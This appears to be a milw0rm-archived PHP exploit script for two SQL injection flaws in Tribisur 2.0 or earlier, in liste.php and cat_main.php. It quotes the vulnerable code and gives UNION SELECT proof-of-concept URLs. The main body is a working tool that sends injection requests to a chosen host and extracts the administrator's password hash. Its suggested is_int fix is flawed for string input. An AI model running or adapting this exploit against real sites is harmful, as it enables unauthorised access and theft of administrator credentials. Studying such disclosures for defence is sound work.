<html><head><title>Tribisur <= 2.0 Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/php -q
&lt;?php
echo &quot;[*]Tribisur &lt;= 2.0 Remote SQL Injection Exploit\r\n&quot;;
echo &quot;[*]Coded by x0kster -x0kster[AT]gmail[DOT]com - \r\n&quot;;
/*
Script Download : http://www.comscripts.com/scripts/php.tribisur-20.1211.html

Bug #1 in modules/forum/liste.php :

 First, this bugged page is included through forum.php :
    &lt;?php
     //forum.php
     [...]
 34. if($action == &quot;liste&quot;) {
 35. include (&quot;./modules/forum/liste.php&quot;);
 36. }
     [...]
	?&gt; 	
	
 And now the bugged code :-) :
    &lt;?php
      //liste.php
      [...]
  5.  $select = 'SELECT * FROM categorie_du_forum WHERE id='.$cat.' ';
  6.  $result = mysql_query($select,$link) or die ('Erreur : '.mysql_error() );
  7.  $total = mysql_num_rows($result);
      [...]
    ?&gt;
    
 So we can exploit it with this simple PoC:
 forum.php?action=liste&amp;cat=-1+union+select+0,concat(pseudo,0x3a,passe),0,0,0,0,0,0,0,0+from+utiliz+where+id=1
      
Bug #2 in cat_main.php :

    &lt;?php
     //cat_main.php
     [...]
 32. $select3 = 'SELECT * FROM menu WHERE valider=&quot;oui&quot; AND id='.$id.' ';
 33. $result3 = mysql_query($select3,$link) or die ('Erreur : '.mysql_error() );
 34. $total3 = mysql_num_rows($result3);  
     [...]
     ?&gt;
     
 So like the first we can exploit it with:
 cat_main.php?id=-1+union+select+0,concat(pseudo,0x3a,passe),0,0,0,0,0,0+from+utiliz+where+id=1
 
 Fix :
 
     &lt;?php
      //liste.php
      [...]
  5.  if(!is_int($cat)){ die(&quot;Hacking Attempt&quot;); }    
  6.  $select = 'SELECT * FROM categorie_du_forum WHERE id='.$cat.' ';
  7.  $result = mysql_query($select,$link) or die ('Erreur : '.mysql_error() );
  8.  $total = mysql_num_rows($result);
      [...]
    ?&gt;
    
    &lt;?php
     //cat_main.php
     [...]
 32. if(!is_int($id)){ die(&quot;Hacking Attempt&quot;); }       
 33. $select3 = 'SELECT * FROM menu WHERE valider=&quot;oui&quot; AND id='.$id.' ';
 34. $result3 = mysql_query($select3,$link) or die ('Erreur : '.mysql_error() );
 35. $total3 = mysql_num_rows($result3);  
     [...]
     ?&gt;
 
Exploit :
*/
if ($argc&lt;4) {
 echo &quot;[*]Usage: php &quot;.$argv[0].&quot; host path mode\r\n&quot;;
 echo &quot;[*]Mode: 1  -SQL Injection in cat_main.php-\r\n&quot;;
 echo &quot;         2  -SQL Injection in modules/forum/liste.php-\r\n&quot;;
 echo &quot;[*]Example:\r\n&quot;;
 echo &quot;[*]php &quot;.$argv[0].&quot; localhost /tribusur/ 1\r\n&quot;;
 die;
}

function get_response($packet){
 global $host, $response;
 $socket=fsockopen(gethostbyname($host),80);
 if (!$socket) { echo &quot;[-]Error contacting $host.\r\n&quot;; exit();}
 fputs($socket,$packet);
 $response='';
 while (!feof($socket)) {
  $response.=fgets($socket);
    }
 fclose($socket);
}

$host =$argv[1];
$path =$argv[2];
$mode =$argv[3];

if($mode == &quot;1&quot;){
 
 $packet =&quot;GET &quot;.$path.&quot;cat_main.php?id=-1+union+select+0,concat(0x78306b73746572,passe,0x78306b73746572),0,0,0,0,0,0+from+utiliz+where+id=1/*&quot;;
 $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
 $packet.=&quot;Connection: Close\r\n\r\n&quot;;
 
}elseif($mode == &quot;2&quot;){
 
 $packet =&quot;GET &quot;.$path.&quot;forum.php?action=liste&amp;cat=-1+union+select+0,concat(0x78306b73746572,passe,0x78306b73746572),0,0,0,0,0,0,0,0+from+utiliz+where+id=1/*&quot;;
 $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
 $packet.=&quot;Connection: Close\r\n\r\n&quot;;
 
}else{
	echo &quot;[-]Incorrect Mode.\r\n&quot;;
	die;
}

get_response($packet);
if(strstr($response,&quot;x0kster&quot;)){
	$hash = explode(&quot;x0kster&quot;,$response,32);
	echo &quot;[+]Ok, the admin hash is : $hash[1]\r\n&quot;;
	die;
}else{
	echo &quot;[-]Exploit filed, maybe fixed?\r\n&quot;;
	die;
}    

?&gt;

# milw0rm.com [2008-01-05]</pre></html>